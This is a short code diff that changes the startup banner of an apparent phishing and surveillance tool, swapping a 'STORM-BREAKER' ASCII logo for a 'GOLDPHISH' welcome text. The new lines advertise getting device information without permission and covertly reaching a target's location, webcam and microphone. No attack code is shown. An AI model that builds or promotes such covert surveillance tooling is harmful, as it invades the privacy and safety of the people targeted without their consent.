@@ -8,14 +8,13 @@ def banner():
       os.system("cls")
     else:
       os.system("clear")
-    print(Fore.LIGHTWHITE_EX+" (               )   (       *                (                     )       (")   
-    print(Fore.LIGHTWHITE_EX+" )\ )  *   )  ( /(   )\ )  (  `           (   )\ )       (       ( /(       )\ )")  
-    print(Fore.LIGHTWHITE_EX+"(()/(` )  /(  )\()) (()/(  )\))(        ( )\ (()/( (     )\      )\()) (   (()/( " )
-    print(Fore.LIGHTWHITE_EX+"/(_))( )(_))((_)\   /(_)_)()\       ___  )((_) /(_)))\ ((((_)(  |((_)\  )\   /(_)) ")
-    print(Fore.CYAN+" (_)) (_(_())   ((_) (_))  (_()((_)|___|((_)_ (_)) ((_) )\ _ )\ |_ ((_)((_) (_)) "  )
-    print(Fore.CYAN+"/ __||_   _|  / _ \ | _ \ |  \/  |      | _ )| _ \| __|(_)_\(_)| |/ / | __|| _ \ " )
-    print(Fore.CYAN+"\__ \  | |   | (_) ||   / | |\/| |      | _ \|   /| _|  / _ \    ' <  | _| |   / " )
-    print(Fore.CYAN+"|___/  |_|    \___/ |_|_\ |_|  |_|      |___/|_|_\|___|/_/ \_\  _|\_\ |___||_|_\\")
+    print(Fore.LIGHTWHITE_EX+"WELCOME TO GOLDPHISH!")   
+    print(Fore.LIGHTWHITE_EX+"**FEATURES**")  
+    print(Fore.LIGHTWHITE_EX+"• Obtain Device Information Without Any Permission !")
+    print(Fore.LIGHTWHITE_EX+"• Access Location [SMARTPHONES ONLY]")
+    print(Fore.LIGHTWHITE_EX+"• Access Webcam and directly send the image to you!")
+    print(Fore.LIGHTWHITE_EX+"• Access Microphone")
+
     print(Style.RESET_ALL)
 
 banner()
